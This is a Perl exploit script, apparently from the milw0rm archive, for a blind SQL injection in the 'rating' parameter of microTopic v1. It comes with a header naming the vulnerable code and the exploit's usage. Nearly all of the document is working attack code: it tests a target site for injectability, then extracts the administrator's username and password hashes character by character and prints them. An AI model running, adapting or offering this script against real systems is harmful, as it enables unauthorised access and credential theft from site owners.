@@ -1,0 +1,227 @@
+#!/usr/bin/perl
+#***********************************************************************************************
+#***********************************************************************************************
+#**	       										      **
+#**  											      **
+#**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []   []      **
+#   [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+#**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+#**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+#   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    
+#**							                                      **
+#**    											      **
+#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+#**					  ¡PROUD TO BE SPANISH!	                              **
+#**											      **
+#***********************************************************************************************
+#***********************************************************************************************
+#
+#----------------------------------------------------------------------------------------------
+#|       	   	     (POST var 'rating') BLIND SQL INJECTION		              |
+#|--------------------------------------------------------------------------------------------|
+#|                         	  | microTopic v1 Initial Release |		 	      |
+#|  CMS INFORMATION:		   -------------------------------			      |
+#|										              |
+#|-->WEB: http://sourceforge.net/projects/microtopic/		   		              |
+#|-->DOWNLOAD: http://sourceforge.net/projects/microtopic/ 	   		              |
+#|-->DEMO: N/A										      |
+#|-->CATEGORY: CMS / Portal								      |
+#|-->DESCRIPTION: Simple News / Opinion site with page ranking Lightweight at ~ 200kb  	      |
+#| 		Secure - Hashed challenge/response login Flexible...			      |
+#|											      |
+#|  CMS VULNERABILITY:									      |
+#|											      |
+#|-->TESTED ON: firefox 3.0.10								      |
+#|-->DORK: "N/A"									      |
+#|-->CATEGORY: BLIND SQL INJECTION/ PERL EXPLOIT					      |
+#|-->AFFECT VERSION: v-1								      |
+#|-->Discovered Bug date: 2009-05-08							      |
+#|-->Reported Bug date: 2009-05-08							      |
+#|-->Fixed bug date: 2009-05-10								      |
+#|-->Info patch (v1.01): http://sourceforge.net/projects/microtopic/			      |   
+#|-->Author: YEnH4ckEr									      |
+#|-->mail: y3nh4ck3r[at]gmail[dot]com							      |
+#|-->WEB/BLOG: N/A									      |
+#|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+#----------------------------------------------------------------------------------------------
+#
+#------------
+#VULN FILES:
+#------------
+#
+#Path --> [HOME_PATH]/admin/utopic.php
+#
+#It contents:
+#
+#	 $query="SELECT UNIX_TIMESTAMP(max(datum)) FROM {$my_table}_ip WHERE id='$_POST[rating]'
+#           AND ip='$_SERVER[REMOTE_ADDR]'";
+#   $sql=SendSQL($query);
+#
+#Path --> [HOME_PATH]/admin/mysql.php
+#
+#It contents:
+#
+#function SendSQL($query){
+#   $sql=mysql_query($query) or die("CANNOT ".$query);
+#   return $sql;
+# }
+#
+#------------
+#CONDITIONS:
+#------------
+#
+#
+#**magic quotes=off
+#
+#
+#######################################################################
+#######################################################################
+##*******************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+##   GREETZ TO: JosS, Ulises2k and all SPANISH Hack3Rs community!    ##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+#
+#-------------------EOF---------------------------------->>>ENJOY IT!
+#
+use LWP::UserAgent;
+use HTTP::Request;
+#Subroutines
+sub lw
+{
+	my $SO = $^O;
+	my $linux = "";
+	if (index(lc($SO),"win")!=-1){
+		$linux="0";
+	}else{
+		$linux="1";
+	}		
+	if($linux){
+		system("clear");
+	}
+	else{
+		system("cls");
+		system ("title microTopic v1 Initial Release (POST var 'rating') BLIND SQL Injection Exploit");
+		system ("color 02");
+	}
+}
+sub request {
+	my $userag = LWP::UserAgent->new;
+	$userag -> agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+	my $request = HTTP::Request -> new(POST => $_[0]);
+	$request->content_type('application/x-www-form-urlencoded');
+	$request->content($_[1]); 
+	my $outcode= $userag->request($request)->as_string;
+	return $outcode;
+}
+sub helper {
+	print "\n\t[XxX] microTopic v1 Initial Release (POST var 'rating') BLIND SQL Injection Exploit\n";
+	print "\t[XxX] USAGE MODE: [XxX]\n";
+	print "\t[XxX] perl $0 [HOST] [PATH] [topic]\n";
+	print "\t[XxX] [HOST]: Web.\n";
+	print "\t[XxX] [PATH]: Home Path. Not path: no-path\n";
+	print "\t[XxX] [topic]: Valid topic. Opt: 1,2,3,4\n";
+	print "\t[XxX] Example: perl $0 'www.example.es' 'microtopic' '1'\n"; 
+}
+sub error {
+	print "\t-----------------------------------------------------------------\n";
+	print "\tWEB IS NOT VULNERABLE!\n";
+	print "\tMaybe --> \n";
+	print "\t1.-Patched\n";
+	print "\t2.-topic doesn't exist\n";
+	print "\t3.-Magic quotes ON\n";
+	print "\tEXPLOIT FAILED!\n";
+	print "\t-----------------------------------------------------------------\n";
+}
+sub testedblindsql {
+	print "\t-----------------------------------------------------------------\n";
+	print "\tWEB IS VULNERABLE!\n";
+	print "\tTested Blind SQL Injection.\n";		
+	print "\tStarting exploit...Waiting...\n"; 
+	print "\t-----------------------------------------------------------------\n";
+}
+sub exploit {
+my $result="";
+$k=1;
+	$z=48;
+	while(($k<=32) && ($z<=126)){
+		$blindsqlpost="rate=1&rating=".$_[1]."'+AND+ascii(substring((SELECT+".$_[2]."+FROM+utopic_login+WHERE+loginid=1),".$k.",1))='".$z."&postedcounter=1&action=doit";
+		$output=&request($_[0],$blindsqlpost);
+		if ( $output =~ (/\<\/head\>\<body\>/))
+		{
+			$result=$result.chr($z);
+			$k++;
+			$z=47;
+		}
+	if($z==57)
+	{
+		$z=96;
+	}
+#new char
+	$z++; 
+	}
+return $result;
+}
+#Main
+&lw;
+	print "\t\t#########################################################\n\n";
+	print "\t\t#########################################################\n\n";
+	print "\t\t##   microTopic v1 Initial Release - BSQLi Exploit     ##\n\n";
+	print "\t\t##                  Author: Y3nh4ck3r                  ##\n\n";
+	print "\t\t##             Condition: magic quotes=off             ##\n\n";
+	print "\t\t##         Contact:y3nh4ck3r[at]gmail[dot]com          ##\n\n";
+	print "\t\t##                  Proud to be Spanish!               ##\n\n";
+	print "\t\t#########################################################\n\n";
+	print "\t\t#########################################################\n\n";
+#Init variables
+	my $host=$ARGV[0];
+	my $path=$ARGV[1];	
+	my $topic=$ARGV[2];
+#Build the uri
+	if($path eq "no-path"){
+		$finalhost="http://".$host."/index.php?topic=".$topic;
+	}else{
+		$finalhost="http://".$host."/".$path."/index.php?topic=".$topic;
+	}
+#Check all variables needed
+$numArgs = $#ARGV + 1;
+	if($numArgs<=2) 
+	{
+		&helper;
+		exit(1);	
+	}
+$finalrequest = $finalhost;	
+#Testing blind sql injection
+$blindsqlpost="rate=1&rating=".$topic."'+AND+1='0&postedcounter=1&action=doit"; #blind sql injection
+$output=&request($finalrequest,$blindsqlpost);
+if ( $output !~ (/\<\/head\>\<body\>/))
+{    
+	#blind sql injection is available
+	&testedblindsql;
+}else{ 
+	#Not injectable
+	&error;
+	exit(1); 
+}	
+#Bruteforcing user...
+$usernamehash=&exploit($finalrequest,$topic,'username');
+#Bruteforcing pass...
+$passhash=&exploit($finalrequest,$topic,'password');
+print "\n\t\t*************************************************\n";
+print "\t\t****     EXPLOIT EXECUTED WITH SUCCESS       ****\n";
+print "\t\t*************************************************\n\n";
+print "\t\tUsername(md5 hash):".$usernamehash."\n";
+print "\t\tPassword(md5 hash):".$passhash."\n\n";
+print "\n\t\t<<----------------------FINISH!-------------------->>\n\n";
+print "\t\t<<---------------Thanks to: y3hn4ck3r-------------->>\n\n";
+print "\t\t<<------------------------EOF---------------------->>\n\n";
+exit(1);
+#Ok...all job done
+
+# milw0rm.com [2009-05-11]
